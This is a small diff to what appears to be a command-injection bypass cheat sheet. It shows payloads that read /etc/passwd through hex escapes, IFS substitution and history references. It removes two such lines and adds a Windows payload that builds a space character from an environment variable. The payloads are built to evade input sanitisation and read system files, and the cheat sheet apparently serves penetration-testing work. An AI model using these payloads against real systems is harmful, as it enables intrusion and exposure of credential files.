@@ -43,9 +43,8 @@ Different way of executing 'whoami' command. These could bypass sanitisations.
 `X=$'cat\x20/etc/passwd'&&$X`  
 `IFS=];a=cat]/etc/passwd;$a`  
 
-With undefined variable combined with historic command reference.  
-`$undefined $undefined`  
-`cat!-1/etc/passwd`  
+Windows only:  
+`ping%PROGRAMFILES:~10,-5%127.0.0.1`
 
 ### Hex encoding bypasses
 All of these execute 'cat /etc/passwd'.  
